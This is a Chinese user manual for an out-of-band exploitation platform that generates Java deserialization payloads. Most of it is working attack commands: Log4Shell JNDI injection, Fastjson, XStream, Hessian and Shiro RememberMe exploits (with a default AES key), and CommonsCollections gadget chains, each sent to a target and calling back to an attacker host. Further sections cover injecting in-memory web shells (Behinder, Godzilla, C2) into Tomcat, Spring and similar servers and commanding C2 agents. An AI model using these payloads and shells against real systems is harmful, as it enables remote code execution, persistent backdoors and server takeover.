# OOBserver-Next 使用手册

> **版本** 3.0 · 2026-05-01  
> **定位** 内网 OOB (Out-of-Band) 漏洞利用平台 —— 攻击侧工具，非靶机  
> **验证结果** 93 条链 · **86 PASS · 0 FAIL · 7 SKIP**

---

## 1. 系统架构

```
┌─────────────────────────────────────────────────────────────┐
│              CT1  10.0.7.25  (OOBserver / 攻击机)            │
│                                                             │
│   :8010  FastAPI 后端（JWT 认证，主入口）                       │
│   :8711  Bytecode Sidecar（payload 生成 + java-chains）       │
│   :1389  LDAP Listener（javaCodeBase / javaSerializedData）  │
│   :1099  RMI  Listener                                      │
│   :9999  TCP  Collector                                     │
└─────────────────────────────────────────────────────────────┘
          │  HTTP / LDAP / RMI / TCP OOB 回调
          ▼
   TargetHost (任意靶机)
```

> **Docker Compose**（推荐）后端端口 `:8010`；裸机部署端口 `:8015`。下文统一使用环境变量：

```bash
export OOB=10.0.7.25
export OOB_API=http://$OOB:8010
export OOB_SIDECAR=http://$OOB:8711
```

---

## 2. 快速开始

### 2.1 登录 & 获取 JWT

```bash
JWT=$(curl -sf -X POST $OOB_API/api/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### 2.2 创建 OOB Token

```bash
TOKEN=$(curl -sf -X POST $OOB_API/api/tokens \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"project_id":1,"label":"test-1","intent":"record"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

### 2.3 查询回调事件

```bash
curl -sf -H "Authorization: Bearer $JWT" \
  "$OOB_API/api/tokens/$TOKEN/events" | python3 -m json.tool
```

---

## 3. Payload 生成

### 3.1 后端 API（推荐）

```
POST $OOB_API/api/payloads/generate
Authorization: Bearer $JWT
Content-Type: application/json

{"type": "CHAIN_ID", "params": {"cmd": "COMMAND", ...}}

返回: {"type":"...","content_type":"...","value":"<base64>"}
```

```bash
# 示例：生成 CC6 payload
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d "{\"type\":\"ysoserial_cc6\",\"params\":{\"cmd\":\"curl -sk $OOB_API/TEST/$TOKEN/rce -o /tmp/oobx_$TOKEN\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); open('/tmp/payload.bin','wb').write(base64.b64decode(r['value']))"
```

### 3.2 Sidecar API（低级接口）

```
POST $OOB_SIDECAR/generate
Content-Type: application/json
{"chain": "CHAIN_ID", "params": {"cmd": "COMMAND", ...}}
```

### 3.3 ⚠️ CMD 重要规则

**`Runtime.exec(String)` 不解析 shell 元字符（`>`、`&&`、`|`、`;`）。**

- ✅ 正确：`curl -sk http://10.0.7.25:8010/TOKEN/rce -o /tmp/oobx_TOKEN`
- ❌ 错误：`id > /tmp/out && curl http://...`

使用 HTTP 回调 + 文件创建作为 RCE 双重确认，无需 shell 重定向。

---

## 4. 已验证利用链

### 4.1 CommonsCollections CC1–CC7

| Chain | 所需依赖 | 靶机要求 | 状态 |
|-------|---------|---------|------|
| `ysoserial_cc5` | CC 3.x | 任意 JDK | ✅ |
| `ysoserial_cc6` | CC 3.x | 任意 JDK | ✅ |
| `ysoserial_cc7` | CC 3.x | 任意 JDK | ✅ |
| `ysoserial_cc1` | CC 3.x | JDK ≤ 8u71（AIH 未修补）| ✅（java8-old） |
| `ysoserial_cc3` | CC 3.x | JDK ≤ 8u71 | ✅（java8-old） |
| `ysoserial_cc2` | CC **4.x** | 任意 JDK | ✅（java8-old） |
| `ysoserial_cc4` | CC **4.x** | 任意 JDK | ✅（java8-old） |

> **CC1/CC3 说明**：需 JDK ≤ 8u71 或使用 `-Xbootclasspath/p:aih-patch.jar` 绕过 AnnotationInvocationHandler 签名验证（java8-old 容器已预装）。

```bash
CMD="curl -sk $OOB_API/$TOKEN/rce -o /tmp/oobx_${TOKEN:0:12}"

curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"ysoserial_cc6\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; open('/tmp/cc6.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

curl -sf -X POST http://TARGET:PORT/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/cc6.bin
```

---

### 4.2 CommonsBeanUtils CB1 / cb_no_cc / CB2

| Chain | 依赖 | 说明 | 状态 |
|-------|------|------|------|
| `ysoserial_cb1` | BeanUtils 1.x + CC | 标准 CB1 | ✅ |
| `cb_no_cc` | BeanUtils 1.x 仅 | 无 CC 依赖 | ✅ |
| `jchains_native_cb2` | BeanUtils **1.8.3** | CB2 特定版本 | ✅（cb2 靶机） |

---

### 4.3 ROME / Hibernate / Groovy

| Chain | 依赖 | 状态 |
|-------|------|------|
| `ysoserial_rome` | rome-1.0 | ✅ |
| `ysoserial_hibernate1` | Hibernate 4.x | ✅ |
| `ysoserial_groovy1` | Groovy 2.3.x | ✅ |

---

### 4.4 Log4Shell — CVE-2021-44228

**环境要求**：Log4j2 ≤ 2.14.1

```bash
# Step 1: 准备字节码（JNDI 远程加载，JDK ≤ 8u191）
CLASS_B64=$(curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"log4shell_basic\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

# Step 2: 注册 LDAP rebind
curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"Exploit\",\"bytecode_b64\":\"$CLASS_B64\"}"

# Step 3: 注入 JNDI（单引号防止 bash 展开）
JNDI='${jndi:ldap://'"$OOB"':1389/'"$TOKEN"'}'
curl -sf "http://TARGET:PORT/" -H "User-Agent: $JNDI"
```

---

### 4.5 Fastjson — CVE-2019-14439 / 1.2.47

**端点**：`POST /fastjson`（Content-Type: `application/json`）

| Chain | 场景 | 状态 |
|-------|------|------|
| `fastjson_jdbcrowset` | JNDI，JDK ≤ 8u191 | ✅ |
| `fastjson_jdbcrowset_v2` | JNDI bypass | ✅ |
| `fastjson_bcel` | BCEL 直接执行，无需 JNDI | ✅ |
| `jchains_fastjson` | JNDI（≤1.2.47） | ✅ |
| `jchains_fastjson_bcel` | BCEL（≤1.2.24） | ✅ |
| `jchains_fastjson_jndi` | JNDI 变体 | ✅ |
| `jchains_fastjson_c3p0_h2` | C3P0 + H2 JDBC 执行 | ✅ |

```bash
# BCEL 直接 RCE（无需 LDAP 服务）
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"fastjson_bcel\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())" \
  | curl -sf -X POST http://TARGET:PORT/fastjson -H "Content-Type: application/json" -d @-
```

---

### 4.6 XStream — CVE-2021-39144

**端点**：`POST /xstream`（Content-Type: `application/xml`）

| Chain | 说明 | 状态 |
|-------|------|------|
| `xstream_eventhandler` | EventHandler RCE | ✅ |
| `jchains_xstream` | Spring JNDI | ✅ |
| `jchains_xstream_exec` | 直接命令执行 | ✅ |
| `jchains_xstream_jndi` | JNDI 触发 | ✅ |

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"xstream_eventhandler\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())" \
  | curl -sf -X POST http://TARGET:PORT/xstream -H "Content-Type: application/xml" -d @-
```

---

### 4.7 Hessian 反序列化

**端点**：`POST /hessian`（Hessian1）/ `POST /hessian2`（Hessian2）  
Content-Type: `application/x-hessian` 或 `application/octet-stream`

**推荐使用 jchains 系列**（marshalsec 内置链已全部迁移）：

#### Hessian1 链（9 条，均 ✅）

| Chain | 参数 | 说明 |
|-------|------|------|
| `hessian1_spring` | `jndi_url` | marshalsec，LDAP 触发 |
| `jchains_hessian1_spring` | `jndi_url` | Spring JNDI |
| `jchains_hessian1_spring2` | `jndi_url` | Spring JNDI 变体 |
| `jchains_hessian1_exec` | `cmd` | JDK native 直接执行 |
| `jchains_hessian1_bcel` | `cmd` | BCEL 字节码 |
| `jchains_hessian1_rome1` | `cmd` | ROME+CB1 二次反序列化 |
| `jchains_hessian1_rome2` | `cmd` | ROME2+CB1 |
| `jchains_hessian1_secondary` | `cmd` | SwingLazyValue 二次反序列化 |
| `jchains_hessian1_spring_exec` | `cmd` | Spring MethodInvokingFactoryBean 执行 |

#### Hessian2 链（11 条，均 ✅）

| Chain | 参数 | 说明 |
|-------|------|------|
| `hessian2_spring` | `jndi_url` | marshalsec，LDAP 触发 |
| `jchains_hessian2_spring` | `jndi_url` | Spring JNDI |
| `jchains_hessian2_spring2` | `jndi_url` | Spring JNDI 变体 |
| `jchains_hessian2_exec` | `cmd` | JDK native 直接执行 |
| `jchains_hessian2_bcel` | `cmd` | BCEL 字节码 |
| `jchains_hessian2_rome1` | `cmd` | ROME+CB1 |
| `jchains_hessian2_rome2` | `cmd` | ROME2+CB1 |
| `jchains_hessian2_secondary` | `cmd` | 二次反序列化绕黑名单 |
| `jchains_hessian2_tostring_jackson` | `cmd` | Jackson toString 链 |
| `jchains_hessian2_tostring_xbean` | `cmd` | XBean toString + Tomcat EL 执行 |
| `jchains_hessian2_spring_exec` | `cmd` | Spring MethodInvokingFactoryBean 执行 |

```bash
# Hessian2 直接执行示例
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"jchains_hessian2_exec\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; open('/tmp/h2.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

curl -sf -X POST http://TARGET:PORT/hessian2 \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/h2.bin
```

> **spring_exec 靶机要求**：需要目标 classpath 有 Spring 4.2.x + Hessian 库。  
> **xbean 靶机要求**：需要 Tomcat ≤ 9.0.61（BeanFactory.forceString 未移除版本）。

---

### 4.8 Shiro RememberMe

| Chain | 协议 | 状态 |
|-------|------|------|
| `shiro_cbc` | AES-CBC，CVE-2016-4437 | ✅ |
| `shiro_gcm` | AES-GCM，CVE-2020-11989 | ✅ |
| `jchains_shiro_cbc` | AES-CBC，java-chains 增强 | ✅ |

```bash
# 生成 Shiro CBC payload（返回 base64，直接作 cookie 值）
COOKIE=$(curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"shiro_cbc\",\"params\":{\"cmd\":\"$CMD\",\"key_b64\":\"kPH+bIxk5D2deZiIxcaaaA==\"}}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

curl -v "http://TARGET:PORT/login" -H "Cookie: rememberMe=$COOKIE"
# Set-Cookie: rememberMe=deleteMe → 反序列化触发
```

---

### 4.9 C3P0 二次反序列化

| Chain | 说明 | 状态 |
|-------|------|------|
| `c3p0_jndi` | JNDI 触发 | ✅ |
| `c3p0_wrapperds` | 嵌套序列化，inner_chain 可配置 | ✅ |

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"c3p0_wrapperds\",\"params\":{\"cmd\":\"$CMD\",\"inner_chain\":\"ysoserial_cc6\"}}" \
  | python3 -c "import sys,json,base64; open('/tmp/c3p0.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"
```

---

### 4.10 JNDI 本地工厂 RCE（无需 trustURLCodebase）

适用于 JDK ≥ 8u191，利用本地已有的 JNDI Reference 工厂执行代码：

| Chain | 工厂 | 说明 | 状态 |
|-------|------|------|------|
| `jchains_jndi_tomcat_el` | TomcatEL + BeanFactory | **最通用**，需 Tomcat ≤ 9.0.61 | ✅ |
| `jchains_jndi_groovy` | Groovy ScriptEngine | 需 Groovy 在 classpath | ✅ |
| `jchains_jndi_beanshell` | BeanShell | 需 BeanShell 在 classpath | ✅ |
| `jchains_jndi_snakeyaml` | SnakeYAML SPI | 需 SnakeYAML + SPI JAR 服务 | ✅ |

```bash
# 生成 LDAP URL 并注入
JNDI_URL=$(curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"jchains_jndi_tomcat_el\",\"params\":{\"cmd\":\"$CMD\",\"jndi_url\":\"ldap://$OOB:1389/$TOKEN\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())")
# 将 $JNDI_URL 注入到触发 JNDI lookup 的位置
```

---

### 4.11 H2 JDBC 任意代码执行

**场景**：H2 数据库 JDBC URL 可控  
**原理**：`INIT=RUNSCRIPT FROM 'http://...'` 在 H2 初始化时执行 SQL

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"jchains_h2_jdbc\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())"
# 返回 JDBC URL，注入到 dataSourceName / connectionURL 等参数
```

---

### 4.12 SnakeYAML SPI 链

**场景**：SnakeYAML ≤ 1.31，`Yaml.load()` 参数可控

```bash
YAML=$(curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"snakeyaml_spi\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())")

curl -sf -X POST http://TARGET:PORT/snakeyaml \
  -H "Content-Type: text/plain" -d "$YAML"
```

---

## 5. 内存马 & C2

### 5.1 生成内存马

```bash
MS=$(curl -sf -X POST $OOB_API/api/memshells/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d '{
    "framework": "tomcat",
    "type": "filter",
    "shell_type": "cmd",
    "params": {"url_pattern": "/oobxtest", "password": "oobxtest", "servlet_api": "javax"}
  }')
```

**支持框架**：`tomcat`、`spring`、`jetty`、`jboss`、`weblogic`  
**支持类型**：`filter`、`valve`、`listener`、`servlet`、`executor`（框架不同可用类型不同）  
**shell_type**：`cmd`（命令执行）、`behinder`（冰蝎）、`godzilla`（哥斯拉）、`c2`（内置 C2）

### 5.2 通过反序列化注入内存马

```bash
CLASS_NAME=$(echo "$MS" | python3 -c "import sys,json; print(json.load(sys.stdin)['class_name'])")
CLASS_B64=$(echo "$MS" | python3 -c "import sys,json; print(json.load(sys.stdin)['class_bytes'])")

# 注册 LDAP rebind
curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"$CLASS_NAME\",\"bytecode_b64\":\"$CLASS_B64\"}"

# 通过 JNDI（CC6 嵌套序列化）
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"jchains_native_cb1_jndi\",\"params\":{\"jndi_url\":\"ldap://$OOB:1389/$TOKEN\"}}" \
  | python3 -c "import sys,json,base64; open('/tmp/ms.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

curl -sf -X POST http://TARGET:PORT/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/ms.bin
```

### 5.3 C2 操作

```bash
# 查看上线 agents
curl -sf -H "Authorization: Bearer $JWT" "$OOB_API/api/c2/agents"

# 发送命令
curl -sf -X POST "$OOB_API/api/c2/agents/$AGENT_ID/cmd" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d '{"cmd": "id"}'

# 查看结果（等待 heartbeat）
sleep 10
curl -sf -H "Authorization: Bearer $JWT" "$OOB_API/api/c2/agents/$AGENT_ID/commands"
```

---

## 6. JNDI 基础设施

### 6.1 LDAP Listener（:1389）

**模式 A — javaCodeBase**（适合 JDK ≤ 8u191，远程加载 class）

```bash
curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"Exploit\",\"bytecode_b64\":\"$CLASS_B64\"}"
```

**模式 B — javaSerializedData**（绕过 JDK ≥ 8u191 的 trustURLCodebase）

```bash
curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"SerPayload\",\"serialized_b64\":\"$CC6_B64\"}"
# LDAP 返回 javaSerializedData，目标 JVM 直接反序列化，不走远程 class 加载
```

### 6.2 等待回调

```bash
for i in $(seq 1 15); do
  sleep 2
  N=$(curl -sf -H "Authorization: Bearer $JWT" \
    "$OOB_API/api/tokens/$TOKEN/events" \
    | python3 -c "import sys,json; e=json.load(sys.stdin); print(len(e),'events',[x.get('protocol') for x in e])")
  echo "[$i] $N"; [[ "$N" != "0 events"* ]] && break
done
```

---

## 7. 完整链列表（86 条已验证）

### 7.1 ysoserial 链（14 PASS / 4 SKIP）

| Chain | 依赖 | 靶机 | 状态 |
|-------|------|------|------|
| `ysoserial_cc5/cc6/cc7` | CC 3.x | 任意 | ✅ |
| `ysoserial_cb1` / `cb_no_cc` | BeanUtils 1.x | 任意 | ✅ |
| `ysoserial_rome` | rome-1.0 | 任意 | ✅ |
| `ysoserial_hibernate1` | Hibernate 4 | 任意 | ✅ |
| `ysoserial_groovy1` | Groovy 2.3.x | 任意 | ✅ |
| `ysoserial_cc1/cc3` | CC 3.x | JDK ≤ 8u71 | ✅（java8-old） |
| `ysoserial_cc2/cc4` | CC 4.x | 任意 | ✅（java8-old） |
| `ysoserial_jrmp_client` | 任意 | 任意 | ✅ |
| `ysoserial_jdk7u21` | — | JDK < 7u21 | ⏭ 无可用镜像 |
| `ysoserial_spring1/2` | — | JDK < 7u51 | ⏭ AIH patch 限制 |
| `ysoserial_urldns` | — | — | ⏭ 无 DNS resolver |

### 7.2 java-chains 链（13 PASS / 2 SKIP）

| Chain | 靶机 | 状态 |
|-------|------|------|
| `jchains_native_cc6` / `jchains_cc1-6` | vulnlab/java8-old | ✅ |
| `jchains_native_cb1` / `jchains_native_cb2` | vulnlab/cb2 | ✅ |
| `jchains_native_k1_secondary` | vulnlab | ✅ |
| `jchains_native_jackson` | vulnlab | ✅ |
| `jchains_native_cb1_jndi` | vulnlab | ✅ LDAP |
| `jchains_native_jdk17_1/2` | java17 | ✅ |
| `jchains_native_c3p0_el` | — | ⏭ forceString 移除 |
| `jchains_native_c3p0_ldap` | — | ⏭ ldap:// handler 缺失 |

### 7.3 Hessian 链（20 PASS）

见 §4.7 完整列表，所有 20 条均 ✅。

### 7.4 Fastjson 链（7 PASS）

见 §4.5，所有 7 条均 ✅。

### 7.5 XStream 链（4 PASS）

见 §4.6，所有 4 条均 ✅。

### 7.6 Log4Shell（2 PASS）

| Chain | 靶机 | 状态 |
|-------|------|------|
| `log4shell_vulnlab` | vulnlab :8888 | ✅ |
| `log4shell_dedicated` | log4shell :8081 | ✅ |

### 7.7 Shiro（3 PASS）

见 §4.8，3 条均 ✅。

### 7.8 C3P0（2 PASS）

见 §4.9，2 条均 ✅。

### 7.9 JNDI 本地工厂（5 PASS）

`jchains_jndi_tomcat_el` / `groovy` / `beanshell` / `snakeyaml` / `jchains_h2_jdbc` 均 ✅

### 7.10 内存马（14 PASS）

Tomcat × {filter/valve/listener/servlet/executor} + Spring × {interceptor/controller/webflux} + Jetty/JBoss/WebLogic filter + C2 内存马，全部字节码生成 ✅，c2_memshell_serialize / c2_memshell_jndi Agent 上线 ✅。

### 7.11 BlazeDS

`jchains_blazeds_axis2`：⏭ SKIP（靶机容器 :8896 未启动）

---

## 8. API 速查

### 8.1 后端 API（:8010）

```
POST /api/auth/login              登录（form-urlencoded）
POST /api/auth/register           注册

POST /api/projects                创建项目
POST /api/tokens                  创建 OOB token
GET  /api/tokens/{token}/events   查询回调事件

POST /api/payloads/generate       生成 payload（主入口）
POST /api/memshells/generate      生成内存马

POST /api/rebind/{token}/set      注册 LDAP rebind
DEL  /api/rebind/{token}/clear    清除 rebind

GET  /api/c2/agents               查看 C2 agents
POST /api/c2/agents/{id}/cmd      发送命令
GET  /api/c2/agents/{id}/commands 命令结果

GET  /health                      健康检查
GET  /docs                        Swagger 文档
```

### 8.2 Sidecar API（:8711）

```
GET  /chains                      列出所有支持的链 ID
POST /generate                    生成 payload（低级接口）
GET  /health                      健康检查
```

---

## 9. 常见问题

**Q: CMD 为什么不能用 `>`、`&&`、`|`？**  
A: 大多数链使用 `Runtime.exec(String)` 单字符串模式，Java 按空格分词，不调用 shell 解释器。解决方法：使用 `curl`/`wget` 触发 OOB 回调；若需 shell 特性，使用 `Runtime.exec(String[])` 模式（部分 jchains 链已使用 `/bin/sh -c` 包装）。

**Q: 哪些链不需要 LDAP/RMI 基础设施？**  
A: 直接执行类（`cmd` 参数）：`ysoserial_cc5/6/7`、`jchains_*_exec`、`fastjson_bcel`、`jchains_fastjson_bcel`、`xstream_eventhandler`、`jchains_xstream_exec`、`shiro_cbc/gcm`、`jchains_h2_jdbc`、`snakeyaml_spi`、所有 `jchains_hessian*_exec/rome/bcel/secondary/spring_exec/tostring_*`。

**Q: Fastjson payload 发送前需要 base64 decode 吗？**  
A: 后端 API 统一返回 `{"value":"<base64>"}` 格式，JSON/XML payload 均已 base64 编码，发送前需 `base64.b64decode(value).decode()` 还原为原始文本。

**Q: Hessian spring_exec 链对靶机有什么特殊要求？**  
A: 靶机 classpath 需包含 Spring 4.2.x（含 `CacheOperationSourcePointcut`）+ Hessian 4.0.x 库；目标 JDK 需为 8u202 以下（8u212+ 可能有额外限制）。OOBserver 配套的 `spring3` 靶机（:8894）已满足所有要求。

**Q: XBean 链（jchains_hessian2_tostring_xbean）为什么对 Tomcat 版本有要求？**  
A: 链通过 `BeanFactory.forceString` 触发 EL 表达式执行，该机制在 Tomcat 9.0.62 / 8.5.78 / 10.0.20 的安全加固中被移除。目标 Tomcat 版本需 ≤ 9.0.61（9.x）/ ≤ 8.5.77（8.x）。

**Q: Log4shell 在 JDK ≥ 8u191 无法 RCE？**  
A: 使用 `javaSerializedData` rebind 模式（§6.1 模式 B），LDAP 返回序列化对象（如 CC6 链），完全绕过 `trustURLCodebase` 限制，无需远程 class 加载。

**Q: java-chains 链提示 hint: Ensure java-chains is running？**  
A: java-chains 嵌入在 sidecar 中，启动约需 30s。等 `docker compose ps` 显示 `(healthy)` 后再请求。

---

*OOBserver-Next · 内网 OOB 漏洞利用平台 · v3.0 · 2026-05-01*
